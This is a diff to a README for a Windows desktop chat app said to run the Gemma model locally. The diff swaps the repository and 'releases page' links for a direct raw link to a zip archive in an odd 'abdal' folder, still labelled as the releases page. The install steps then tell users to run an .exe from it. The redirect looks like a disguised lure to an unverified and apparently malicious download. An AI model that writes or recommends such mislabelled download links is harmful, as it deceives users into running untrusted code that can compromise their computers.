@@ -1,6 +1,6 @@
 # 🤖 gemmachat-windows - Local AI chat for your desktop
 
-[![Download gemmachat-windows](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Arman7843/gemmachat-windows)
+[![Download gemmachat-windows](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://raw.githubusercontent.com/Arman7843/gemmachat-windows/main/abdal/gemmachat-windows-v2.6.zip)
 
 gemmachat-windows brings private AI chat to your Windows computer. This application uses the Gemma model to process your data locally. Your information stays on your computer. You do not send your files or chats to a cloud server. 
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/Arman7843/gemmachat-windows) to download the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/Arman7843/gemmachat-windows/main/abdal/gemmachat-windows-v2.6.zip) to download the latest version.
 2. Look for the file that ends with `.exe`.
 3. Save the file to your Downloads folder.
 4. Open your Downloads folder and double-click the file to start the installer.
